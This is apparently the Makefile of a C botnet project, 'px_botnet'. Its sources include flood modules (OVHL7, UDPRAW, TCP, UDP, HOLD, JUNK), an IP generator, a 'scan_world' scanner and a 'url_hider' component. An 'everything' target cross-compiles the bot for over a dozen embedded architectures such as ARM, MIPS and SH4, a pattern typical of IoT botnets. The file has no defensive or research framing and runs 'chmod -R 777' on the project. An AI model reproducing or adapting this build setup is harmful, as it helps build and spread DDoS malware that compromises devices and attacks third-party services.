BLU					= \033[0;34m
GRN					= \033[0;32m
RED					= \033[0;31m
RST					= \033[0m
END					= \e[0m

SRCS				= px_botnet.c src/ft_strnjoin.c src/ft_free_split.c src/ft_generate_ip.c src/ft_intlen.c \
					  src/ft_get_id.c src/request/ft_request.c src/request/http.c src/protocol/global.c src/protocol/OVHL7.c \
					  src/protocol/HOLD.c src/protocol/HTTP.c src/protocol/JUNK.c src/protocol/RANDHEX.c \
					  src/protocol/STD.c src/protocol/TCP.c src/protocol/UDPRAW.c src/protocol/XTDCUSTOM.c \
					  src/protocol/UDP.c src/ft_getarch.c src/ft_scan_world.c src/protocol/PPS.c src/libft/ft_putnbr_fd.c \
					  src/libft/ft_putendl_fd.c src/libft/ft_putchar_fd.c src/libft/ft_putstr_fd.c src/libft/ft_striteri.c \
					  src/libft/ft_strmapi.c src/libft/ft_itoa.c src/libft/ft_split.c src/libft/ft_substr.c src/libft/ft_strtrim.c \
					  src/libft/ft_strjoin.c src/libft/ft_atoi.c src/libft/ft_bzero.c src/libft/ft_isalnum.c src/libft/ft_isalpha.c \
					  src/libft/ft_isascii.c src/libft/ft_isdigit.c src/libft/ft_isprint.c src/libft/ft_memchr.c src/libft/ft_memcmp.c \
					  src/libft/ft_memcpy.c src/libft/ft_memmove.c src/libft/ft_memset.c src/libft/ft_strchr.c src/libft/ft_strlcat.c \
					  src/libft/ft_strlcpy.c src/libft/ft_strlen.c src/libft/ft_strncmp.c src/libft/ft_strnstr.c src/libft/ft_strrchr.c \
					  src/libft/ft_tolower.c src/libft/ft_toupper.c src/libft/ft_strdup.c src/libft/ft_calloc.c

NAME				= px_botnet
OBJS_DIR			= objs/
PROJECT_H			= includes/px_botnet.h
OBJS				= $(SRCS:.c=.o)
OBJECTS_PREFIXED	= $(addprefix $(OBJS_DIR), $(OBJS))
CC					= $(cross)gcc
AR					= $(cross)ar
CC_FLAGS			= -O3 -ffast-math -O2 -lpthread #-lssh -march=native -Ofast -Wno-format-extra-args -Wno-unused-result -Wno-format-contains-nul -flto #-Wall -Werror -Wextra

$(OBJS_DIR)%.o : %.c $(PROJECT_H)
	@mkdir -p $(OBJS_DIR)
	@mkdir -p $(OBJS_DIR)src
	@mkdir -p $(OBJS_DIR)src/request
	@mkdir -p $(OBJS_DIR)src/protocol
	@mkdir -p $(OBJS_DIR)src/libft
	$(CC) $(CC_FLAGS) -c ./$< -o ./$@
	@printf	"\033[2K\r${BLU}[BUILD]${RST} '$<' $(END)"

$(NAME): $(OBJECTS_PREFIXED)
	@$(CC) -o $(NAME) $(OBJECTS_PREFIXED) $(CC_FLAGS)
	@printf "\033[2K\r\033[0;32m[END]\033[0m $(NAME)$(END)\n"

all: $(NAME)
	make -C url_hider

everything:
	@chmod -R 777 *
	@make fclean
	@rm -rf cross_compiled
	@mkdir cross_compiled
	@make cross=./cc/armv4l/bin/armv4l-
	@mv $(NAME) cross_compiled/armv4l
	@make fclean
	@make cross=./cc/armv5l/bin/armv5l-
	@mv $(NAME) cross_compiled/armv5l
	@make fclean
	@make cross=./cc/armv6l/bin/armv6l-
	@mv $(NAME) cross_compiled/armv6l
	@make fclean
	@make cross=./cc/i586/bin/i586-
	@mv $(NAME) cross_compiled/i586
	@make fclean
	@make cross=./cc/i686/bin/i686-
	@mv $(NAME) cross_compiled/i686
	@make fclean
	@make cross=./cc/m68k/bin/m68k-
	@mv $(NAME) cross_compiled/m68k
	@make fclean
	@make cross=./cc/mips/bin/mips-
	@mv $(NAME) cross_compiled/mips
	@make fclean
	@make cross=./cc/mipsel/bin/mipsel-
	@mv $(NAME) cross_compiled/mipsel
	@make fclean
	@make cross=./cc/powerpc/bin/powerpc-
	@mv $(NAME) cross_compiled/powerpc
	@make fclean
	@make cross=./cc/powerpc-440fp/bin/powerpc-440fp-
	@mv $(NAME) cross_compiled/powerpc-440fp
	@make fclean
	@make cross=./cc/sh4/bin/sh4-
	@mv $(NAME) cross_compiled/sh4
	@make fclean
	@make cross=./cc/sparc/bin/sparc-
	@mv $(NAME) cross_compiled/sparc
	@make fclean
	@make cross=./cc/x86_64/bin/x86_64-
	@mv $(NAME) cross_compiled/x86_64
	@make fclean
	@echo All cross compiled binaries are in cross_compiled/

clean:
	@make clean -C url_hider
	@rm -rf $(OBJS_DIR)
	@printf "\033[2K\r${GRN}[CLEAN]${RST} done$(END)"

fclean: clean
	@make fclean -C url_hider
	@rm -f $(NAME)
	@rm -rf cross_compiled
	@printf "\033[2K\r${GRN}[FCLEAN]${RST} done$(END)"

re: fclean all

.PHONY:		everything all clean fclean re